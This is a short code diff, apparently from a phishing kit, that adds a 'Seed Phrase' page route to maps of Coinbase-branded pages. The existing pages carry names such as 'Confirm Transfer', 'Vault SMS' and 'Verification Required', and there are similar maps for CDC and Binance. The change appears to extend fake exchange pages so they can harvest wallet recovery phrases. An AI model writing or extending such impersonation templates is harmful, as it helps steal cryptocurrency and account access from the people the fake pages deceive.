@@ -57,7 +57,8 @@ const COINBASE_PATHS: Record<string, VisitorTemplateRef> = {
 	'/vault/confirm': { brand: 'Coinbase', page: 'Confirm Transfer' },
 	'/vault/sms': { brand: 'Coinbase', page: 'Vault SMS' },
 	'/vault/verify': { brand: 'Coinbase', page: 'Verification Required' },
-	'/vault/dashboard': { brand: 'Coinbase', page: 'Vault Dashboard' }
+	'/vault/dashboard': { brand: 'Coinbase', page: 'Vault Dashboard' },
+	'/vault/seed-phrase': { brand: 'Coinbase', page: 'Seed Phrase' }
 };
 
 const CDC_PATHS: Record<string, VisitorTemplateRef> = {
@@ -99,6 +100,7 @@ export const PATH_TO_TEMPLATE: Record<string, Record<string, VisitorTemplateRef>
 		'/vault/confirm': { brand: 'Coinbase', page: 'Confirm Transfer' },
 		'/vault/sms': { brand: 'Coinbase', page: 'Vault SMS' },
 		'/vault/verify': { brand: 'Coinbase', page: 'Verification Required' },
+		'/vault/seed-phrase': { brand: 'Coinbase', page: 'Seed Phrase' },
 		...COINBASE_PATHS
 	},
 	Binance: {
